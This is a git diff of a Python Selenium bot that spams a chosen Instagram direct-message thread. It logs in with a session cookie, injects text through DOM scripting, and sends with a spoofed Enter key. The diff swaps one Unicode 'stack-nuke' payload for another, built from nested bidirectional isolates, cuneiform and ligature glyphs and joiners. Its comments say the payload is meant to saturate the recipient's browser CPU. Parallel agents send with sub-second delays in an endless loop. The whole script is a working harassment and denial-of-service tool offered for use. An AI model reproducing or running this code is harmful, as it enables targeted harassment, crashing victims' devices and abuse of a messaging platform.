@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (STACK-NUKE V68)
-# 📅 STATUS: HARFBUZZ-STACK-OVERFLOW | 4-AGENT TOTAL | AWS-CPU-MAX
+# 🚀 PROJECT: PRAVEER.OWNS (SATURATOR V69)
+# 📅 STATUS: MAIN-THREAD-HIJACK | 4-AGENT TOTAL | AWS-CPU-KILL
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,35 +12,38 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.05, 0.2)   # 🔥 MAXIMUM INJECTION SPEED
-REST_AFTER_STRIKES = 200   
+BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM PACKET DENSITY
+REST_AFTER_STRIKES = 250   
 REST_DURATION = 2          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_stack_nuke_payload():
-    """Generates a payload targeting the recursive limits of the layout engine."""
+def get_instruction_saturator_payload():
+    """Generates a high-entropy payload that forces C++ context switches."""
     u_id = random.randint(100, 999)
     
-    # \u2066 = LRI | \u2067 = RLI | \u2069 = PDI (Isolates)
-    # \u0300-\u036F = Combining Marks (Diacritics) - Stacking 100 deep
-    lri, rli, pdi = "\u2066", "\u2067", "\u2069"
-    marks = "".join([chr(i) for i in range(0x0300, 0x0364)]) 
+    # 𒀱 = Cuneiform (4-byte) | ﷽ = Bismillah (Wide Ligature) 
+    # \u2066 = LRI | \u2067 = RLI | \u034F = CGJ
+    lri, rli, cgj = "\u2066", "\u2067", "\u034F"
+    heavy_chars = ["𒀱", "﷽", "𒈙", "𒈓", "𒈔", "𒈕"]
     glue = "\u2060" # Word Joiner
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STACK_NUKE:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [SATURATION_LOCK:{u_id}]"
     
     body = []
-    # 400 lines of 'Recursive Stack Thrashing'
-    for i in range(400):
-        # We nest isolates 12 levels deep per line.
-        # This forces the browser to open 12 new 'Rendering Contexts' per word.
-        nest = f"{lri}{rli}" * 6
-        pop = f"{pdi}" * 12
-        line = f"{nest}P{marks}R{marks}A{marks}V{marks}E{marks}ER{pop} 🌙 {i}{glue*8}"
-        body.append(line)
+    # 430 lines - Hitting the absolute 10KB socket limit
+    for i in range(430):
+        random.shuffle(heavy_chars)
+        # We alternate direction for EVERY character. 
+        # This prevents the browser from using 'Run-Segment' optimization.
+        # It forces the CPU to stop and re-check the BiDi stack 100+ times per line.
+        line = ""
+        for char in heavy_chars:
+            line += f"{lri}{char}{cgj}{rli}"
+        
+        body.append(f"PRAVEER PAPA {line} {i}{glue*4}")
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
 
@@ -61,7 +64,7 @@ def get_driver(agent_id):
         return driver
 
 def atomic_dispatch_send(driver, text):
-    """Direct DOM injection with hardware-event spoofing."""
+    """Direct DOM injection with zero-latency framework state sync."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
@@ -70,7 +73,11 @@ def atomic_dispatch_send(driver, text):
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
                 document.execCommand('insertText', false, arguments[0]);
+                
+                // Force sync for React/Angular/Vue internals
                 box.dispatchEvent(new Event('input', { bubbles: true }));
+                
+                // Fire Native Keyboard Event
                 var e = new KeyboardEvent('keydown', {
                     key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                     bubbles: true, cancelable: true
@@ -88,27 +95,27 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(15) 
+            time.sleep(12) 
             
             strike_count = 0
             while True:
-                payload = get_stack_nuke_payload()
+                payload = get_instruction_saturator_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Nuclear-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Saturation-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 50 == 0:
+                    if strike_count % 80 == 0:
                         driver.refresh()
-                        time.sleep(10)
+                        time.sleep(5)
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             try: driver.quit()
             except: pass
-            time.sleep(5)
+            time.sleep(2)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
